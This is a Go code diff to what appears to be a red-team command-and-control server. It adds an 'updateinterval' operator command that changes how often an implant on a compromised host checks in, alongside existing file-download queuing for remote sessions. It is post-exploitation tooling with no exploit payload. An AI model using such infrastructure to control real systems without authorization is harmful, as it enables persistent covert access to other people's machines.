@@ -83,6 +83,7 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 	var getFileName string
 	var getFile string
 	var getIsGetChatLog = false
+	var getUpdateInterval string
 
 	// Get the Remote Address of the Implant from the request
 	remoteAddr := r.RemoteAddr
@@ -259,6 +260,10 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 		returnErr := errors.New(errorString)
 		ErrorHandler(returnErr)
 		return
+	}
+
+	if len(getParams["interval"]) > 0 {
+		getUpdateInterval = getParams["interval"][0]
 	}
 
 	if getPolling || getIsChatShell {
@@ -449,6 +454,34 @@ func handleWolfPackRequests(w http.ResponseWriter, r *http.Request) {
 					} else {
 						var cmdString = "download " + getFileName
 						core.LogData("Session " + strconv.Itoa(getActiveSession) + " requested to download the file: " + getFileName)
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
+					}
+				}
+
+			} else if getCommand[0] == "updateinterval" {
+
+				if getUpdateInterval != "" {
+					if core.Sessions[getActiveSession].CommandQuery != "" {
+
+						var cmdString = "updateinterval"
+
+						core.LogData("Session " + strconv.Itoa(getActiveSession) + " requested to update the implant's check in interval to: " + getUpdateInterval)
+						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
+
+						data, err := core.ExecuteConnection(core.Sessions[getActiveSession].Rhost, core.Sessions[getActiveSession].Rport, core.Sessions[getActiveSession].Protocol, core.Sessions[getActiveSession].ShellPath, core.Sessions[getActiveSession].CommandQuery, cmdString, core.Sessions[getActiveSession].Query, core.Sessions[getActiveSession].RequestType, getUpdateInterval, "")
+						if err != nil {
+							data = "an error occurred executing the connection, is the shell still up?"
+						}
+
+						core.LogData("Session " + strconv.Itoa(getActiveSession) + " returned:\n" + data)
+
+						currentWolf := core.Wolves[CurrentOperator]
+						jsonData := `{"updateinterval":"` + getUpdateInterval + `"}`
+						core.AssignWolfBroadcast(currentWolf.Username, currentWolf.Rhost, jsonData)
+					} else {
+						var cmdString = "updateinterval"
+						core.LogData("Session " + strconv.Itoa(getActiveSession) + " requested to update the implant's check in interval to: " + getUpdateInterval)
 						core.LogData(CurrentOperator + " executed on session " + strconv.Itoa(getActiveSession) + ": " + cmdString)
 						core.QueueImplantCommand(getActiveSession, cmdString, CurrentOperator)
 					}
